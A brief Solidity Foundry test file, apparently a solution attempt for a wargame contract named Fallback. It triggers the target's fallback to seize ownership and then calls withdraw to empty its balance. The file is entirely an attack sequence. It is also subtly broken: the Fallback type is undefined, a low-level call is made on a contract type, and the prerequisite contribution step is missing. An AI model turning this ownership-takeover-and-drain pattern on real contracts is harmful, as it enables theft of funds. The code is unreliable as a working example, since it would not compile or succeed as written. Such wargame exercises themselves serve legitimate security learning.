// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract FallbackTest {
    Fallback public fallbackContract;

    constructor(address _fallbackAddress) {
        fallbackContract = Fallback(_fallbackAddress);
    }

    function testClaimOwnership() public {
        // Call the fallback function to claim ownership
        fallbackContract.call{value: 0.001 ether}("");
    }

    function testReduceBalance() public {
        // Call the withdraw function to reduce the contract's balance to 0
        fallbackContract.withdraw();
    }
}
